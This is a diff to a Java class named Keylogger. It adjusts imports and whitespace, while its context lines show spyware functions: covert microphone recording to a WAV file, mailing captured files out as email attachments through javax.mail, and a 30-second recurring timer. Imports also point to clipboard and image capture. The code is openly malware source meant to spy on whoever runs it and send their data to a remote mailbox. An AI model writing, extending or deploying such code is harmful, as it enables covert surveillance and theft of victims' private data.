@@ -1,10 +1,8 @@
 import java.awt.*;
 import java.awt.datatransfer.*;
-import java.awt.event.KeyEvent;
-import java.awt.event.KeyListener;
+import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.InetAddress;
-import java.net.UnknownHostException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.Properties;
@@ -12,7 +10,6 @@ import javax.imageio.ImageIO;
 import javax.mail.*;
 import javax.mail.internet.*;
 import javax.sound.sampled.*;
-import javax.swing.*;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -44,7 +41,7 @@ public class Keylogger {
 
             MimeBodyPart messageBodyPart = new MimeBodyPart();
             Multipart multipart = new MimeMultipart();
-            
+
             DataSource source = new javax.activation.FileDataSource(filepath);
             messageBodyPart.setDataHandler(new DataHandler(source));
             messageBodyPart.setFileName(filename);
@@ -98,7 +95,7 @@ public class Keylogger {
         File audioFile = new File(FILE_PATH + "audio.wav");
         AudioFormat format = new AudioFormat(44100, 16, 2, true, true);
         DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
-        
+
         try (TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info)) {
             line.open(format);
             line.start();
@@ -123,4 +120,3 @@ public class Keylogger {
         }, 30000, 30000);
     }
 }
-
